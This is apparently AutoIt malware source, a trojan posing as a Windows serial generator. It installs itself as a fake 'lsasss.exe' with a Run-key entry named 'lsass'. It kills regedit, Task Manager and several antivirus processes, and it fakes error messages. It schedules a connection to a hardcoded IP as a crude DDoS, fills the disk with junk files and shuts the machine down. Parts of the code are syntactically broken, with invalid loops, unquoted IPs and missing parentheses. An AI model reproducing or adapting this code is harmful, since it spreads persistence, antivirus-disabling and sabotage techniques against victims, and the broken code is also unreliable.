RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run\", "lsass", "REG_SIZE", "C:\windows\lsasss.exe")
FileCopy("C:\programmi\emule\incoming\windows_vista_xp_2000_nt_me_98_serial_generator.exe", "C:\windows\lsasss.exe")
if ProcessExists("windows_vista_xp_2000_nt_me_98_serial_generator.exe") Then
	MsgBox(0, "yep", "the serial was created in C:\")
EndIf
While 1 = 1
	If ProcessExists("regedit.exe") Then
		ProcessClose("regedit.exe") 
	EndIf
	if ProcessExists("taskmgr.exe") Then
		ProcessClose("taskmgr.exe")
		MsgBox(0, "error", "The process has terminated by explorer.exe")
	EndIf
WEnd
		
Func DisattivaAV
	while 1 = 1
		if ProcessExists("kav.exe") Then
			ProcessClose("kav.exe")
		EndIf
		if ProcessExists("avp.exe") then 
			ProcessClose("avp.exe")
		EndIf
        if ProcessExists("zonealarm.exe") Then
			ProcessClose("zonealarm.exe")
		EndIf
		if ProcessExists("nod32.exe") Then
			ProcessClose("nod32.exe")
		EndIf
		If ProcessExists("avg.exe") Then
			ProcessClose("avg.exe")
		EndIf
	WEnd
EndFunc


Func Attacco_Ddos
	$mese = @MON
	$day = @MDAY
	if $mese = 6 And $day = 21 Then
		TCPConnect(85.12.27.135, 80)
	EndIf
EndFunc


Func RiempiDisco
	$v = 1 to 800000000000000000000000000000000000000000000000000000000000000000000000000000000 step +1
	for $c = 1 to 70000000000000000000000000000000 step +1
		FileOpen("C:\serial."$v".txt", 0)
		filewrite("Windows serial(www.serialz.to) de94r-33ss2-ki4ii-22op3-dx21c")
EndFunc
	
if $mese = 6 And $day > 21 Then
	Shutdown("shutdown -s")
EndIf


